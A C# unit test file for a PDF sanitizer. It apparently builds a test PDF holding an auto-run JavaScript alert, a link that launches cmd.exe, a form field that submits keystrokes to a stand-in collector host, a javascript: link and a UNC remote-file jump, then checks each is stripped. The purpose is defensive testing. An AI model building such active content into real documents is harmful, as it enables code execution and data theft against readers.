using System.Text;
using PdfPecker.Pdf;
using PdfPecker.Rendering.Parsing;

namespace PdfPecker.Tests;

/// <summary>Removing JavaScript and other active content from PDFs made by others.</summary>
public class SanitizerTests
{
    private static byte[] Fixture(string name) => File.ReadAllBytes(Path.Combine(AppContext.BaseDirectory, "Fixtures", name));

    /// <summary>
    /// A one-page PDF with every kind of active content: a script that runs on open, a document script, catalog and page
    /// additional actions, a link that launches a program, a field that submits its value on each key, a script and a
    /// <c>javascript:</c> address behind links, a script chained after a harmless jump, a media annotation, XFA and an
    /// attachment. A web link, a jump to the page and the field itself are harmless.
    /// </summary>
    private static byte[] Hostile()
    {
        var objects = new List<string>
        {
            "<< /Type /Catalog /Pages 2 0 R /OpenAction 7 0 R /AA << /WC 7 0 R >> /Names << /JavaScript << /Names [(js1) 7 0 R] >> /EmbeddedFiles << /Names [(invoice.xml) 9 0 R] >> >> /AcroForm << /Fields [11 0 R] /XFA 12 0 R >> >>",
            "<< /Type /Pages /Count 1 /Kids [3 0 R] >>",
            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R /AA << /O 7 0 R >> /Annots [8 0 R 11 0 R 13 0 R 14 0 R 15 0 R 16 0 R 17 0 R] >>",
            "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
            "<< /Length 44 >>\nstream\nBT /F1 12 Tf 72 720 Td (Active content) Tj ET\nendstream",
            "null",
            "<< /S /JavaScript /JS (app.alert\\('pwned'\\)) >>",
            "<< /Type /Annot /Subtype /Link /Rect [72 700 300 730] /A << /S /Launch /F (cmd.exe) >> >>",
            "<< /Type /Filespec /F (invoice.xml) /UF (invoice.xml) /EF << /F 10 0 R >> >>",
            "<< /Type /EmbeddedFile /Length 6 >>\nstream\n<x/>\n\nendstream",
            "<< /FT /Tx /T (name) /V (Ada) /Type /Annot /Subtype /Widget /Rect [72 600 300 620] /P 3 0 R /AA << /K << /S /SubmitForm /F << /FS /URL /F (http://collector.example/) >> >> >> >>",
            "<< /Length 7 >>\nstream\n<xdp/>\n\nendstream",
            "<< /Type /Annot /Subtype /Link /Rect [72 560 300 580] /A << /S /URI /URI (javascript:alert\\(1\\)) >> >>",
            "<< /Type /Annot /Subtype /Link /Rect [72 520 300 540] /A << /S /GoTo /D [3 0 R /Fit] /Next 7 0 R >> >>",
            "<< /Type /Annot /Subtype /Screen /Rect [72 480 300 500] >>",
            "<< /Type /Annot /Subtype /Link /Rect [72 440 300 460] /A << /S /URI /URI (https://example.com/) >> >>",
            "<< /Type /Annot /Subtype /Link /Rect [72 400 300 420] /A << /S /GoToR /F (\\\\\\\\server\\\\share\\\\x.pdf) /D [0 /Fit] >> >>",
        };
        var sb = new StringBuilder("%PDF-1.7\n");
        var offsets = new List<int>();
        for (int i = 0; i < objects.Count; i++)
        {
            offsets.Add(sb.Length);
            sb.Append(i + 1).Append(" 0 obj\n").Append(objects[i]).Append("\nendobj\n");
        }
        int xref = sb.Length;
        sb.Append("xref\n0 ").Append(objects.Count + 1).Append("\n0000000000 65535 f \n");
        foreach (var o in offsets) sb.Append(o.ToString("D10", System.Globalization.CultureInfo.InvariantCulture)).Append(" 00000 n \n");
        sb.Append("trailer\n<< /Size ").Append(objects.Count + 1).Append(" /Root 1 0 R >>\nstartxref\n").Append(xref).Append("\n%%EOF\n");
        return Encoding.Latin1.GetBytes(sb.ToString());
    }

    private static List<string> Links(PdfFile file)
    {
        var page = (PdfDict)file.Resolve(file.GetArray(file.GetDict(file.Catalog, "Pages"), "Kids")![0])!;
        var result = new List<string>();
        foreach (var a in file.GetArray(page, "Annots")!.Items)
        {
            var annot = (PdfDict)file.Resolve(a)!;
            var action = file.GetDict(annot, "A");
            result.Add(file.GetName(annot, "Subtype") + ":" + (action == null ? "-" : file.GetName(action, "S")));
        }
        return result;
    }

    [Fact]
    public void Removes_scripts_and_active_actions_and_keeps_the_rest()
    {
        var pdf = Hostile();
        Assert.True(PdfSanitizer.HasActiveContent(pdf));

        var clean = PdfSanitizer.RemoveActiveContent(pdf);
        Assert.False(PdfSanitizer.HasActiveContent(clean));
        var file = PdfFile.Open(clean, null);
        var catalog = file.Catalog!;
        Assert.Null(catalog["OpenAction"]);
        Assert.Null(catalog["AA"]);
        Assert.Null(file.GetDict(catalog, "Names")!["JavaScript"]);
        Assert.Null(file.GetDict(catalog, "AcroForm")!["XFA"]);
        var page = (PdfDict)file.Resolve(file.GetArray(file.GetDict(catalog, "Pages"), "Kids")![0])!;
        Assert.Null(page["AA"]);

        // The launch, script-address and remote-file links lose their actions, the media annotation goes, and the jump
        // loses the script chained after it; the web link, the jump and the field stay.
        Assert.Equal(new[] { "Link:-", "Widget:-", "Link:-", "Link:GoTo", "Link:URI", "Link:-" }, Links(file));
        var jump = file.GetDict((PdfDict)file.Resolve(file.GetArray(page, "Annots")![3])!, "A")!;
        Assert.Null(jump["Next"]);
        var field = (PdfDict)file.Resolve(file.GetArray(file.GetDict(catalog, "AcroForm"), "Fields")![0])!;
        Assert.Null(field["AA"]);
        Assert.Equal("Ada", (file.Resolve(field["V"]) as PdfString)?.Text);

        Assert.Contains("Active content", PdfText.Extract(clean));
        Assert.Single(PdfAttachments.List(clean)); // attachments stay unless asked
        var text = Encoding.Latin1.GetString(clean);
        Assert.DoesNotContain("JavaScript", text);
        Assert.DoesNotContain("pwned", text);
        Assert.DoesNotContain("cmd.exe", text);
    }

    [Fact]
    public void Removes_attachments_when_asked()
    {
        var options = new PdfSanitizeOptions { RemoveAttachments = true };
        var clean = PdfSanitizer.RemoveActiveContent(Hostile(), options);
        Assert.Empty(PdfAttachments.List(clean));
        Assert.False(PdfSanitizer.HasActiveContent(clean, options));
    }

    [Fact]
    public void A_PDF_without_active_content_comes_back_unchanged()
    {
        var pdf = HtmlToPdf.Convert("<h1>Plain</h1><p><a href=\"https://example.com\">A link</a> and <a href=\"#top\">a jump</a>.</p>");
        Assert.False(PdfSanitizer.HasActiveContent(pdf));
        var result = PdfSanitizer.RemoveActiveContent(pdf);
        Assert.Equal(pdf, result);
        Assert.NotSame(pdf, result);
    }

    [Fact]
    public void Streams_work_like_arrays()
    {
        var input = new MemoryStream(Hostile());
        var output = new MemoryStream();
        PdfSanitizer.RemoveActiveContent(input, output);
        Assert.Equal(PdfSanitizer.RemoveActiveContent(Hostile()), output.ToArray());
    }

    [Fact]
    public void Encrypted_PDFs_are_refused()
    {
        var encrypted = HtmlToPdf.Convert("<p>Secret</p>", new PdfOptions { Security = new PdfSecurity { UserPassword = "open", OwnerPassword = "owner" } });
        var ex = Assert.Throws<ArgumentException>(() => PdfSanitizer.RemoveActiveContent(encrypted));
        Assert.Contains("PdfProtector.Decrypt", ex.Message);
        Assert.False(PdfSanitizer.HasActiveContent(encrypted, password: "open"));
        Assert.Throws<InvalidDataException>(() => PdfSanitizer.RemoveActiveContent(Encoding.ASCII.GetBytes("not a pdf")));
    }

    [Theory]
    [InlineData("third-party/chromium.pdf")]
    [InlineData("third-party/chromium-qpdf.pdf")]
    [InlineData("third-party/ghostscript.pdf")]
    [InlineData("third-party/libreoffice.pdf")]
    [InlineData("third-party/reportlab.pdf")]
    [InlineData("features.pdf")]
    public void PDFs_from_other_writers_keep_their_pages_and_text(string name)
    {
        var pdf = Fixture(name);
        var clean = PdfSanitizer.RemoveActiveContent(pdf, new PdfSanitizeOptions { RemoveAttachments = true });
        Assert.False(PdfSanitizer.HasActiveContent(clean, new PdfSanitizeOptions { RemoveAttachments = true }));
        Assert.Equal(PdfPages.Count(pdf), PdfPages.Count(clean));
        Assert.Equal(PdfText.Extract(pdf), PdfText.Extract(clean));
    }
}
